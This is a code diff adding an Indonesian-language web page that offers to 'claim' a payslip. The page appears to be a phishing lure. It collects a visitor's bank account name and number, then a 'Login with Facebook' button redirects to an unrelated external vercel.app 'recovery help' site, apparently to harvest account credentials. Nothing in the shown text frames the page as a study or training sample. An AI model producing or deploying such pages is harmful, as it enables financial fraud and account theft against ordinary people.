@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Slip Gaji</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+    <h2>Klaim Slip Gaji</h2>
+
+    <!-- Form Input -->
+    <div class="form-group">
+        <label for="employee_id">Nama Rekening:</label>
+        <input type="text" id="employee_id" placeholder="Masukkan Nama Rekening">
+    </div>
+    <div class="form-group">
+        <label for="employee_name">Nomor Rekening:</label>
+        <input type="number" id="employee_name" placeholder="Masukkan Nomor Rekening">
+    </div>
+    <div class="form-group">
+        <label for="month">Bulan Anda Mendapatkan Slip Gaji:</label>
+        <input type="text" id="month" placeholder="Masukkan Bulan(misal: Januari)">
+    </div>
+    <div class="form-group">
+        <label for="year">Tahun Anda Mendapatkan Slip Gaji:</label>
+        <input type="number" id="year" placeholder="Masukkan Tahun">
+    </div>
+    <button onclick="claimSalary()">Klaim Slip Gaji</button>
+
+    <div id="result" class="result fade">
+        Slip gaji berhasil diklaim! Silahkan Klik Di Bawah Ini Untuk Verifikasi
+    </div>
+    <div id="error" class="error fade">
+        Semua bidang harus diisi dengan benar!
+    </div>
+
+    <!-- Tombol Login dengan Facebook (mengarah ke link yang ditentukan) -->
+    <div class="fb-login-button" onclick="window.location.href='https://bantuan-pemulihan.vercel.app/';">
+        <button type="button">Login dengan Facebook</button>
+    </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
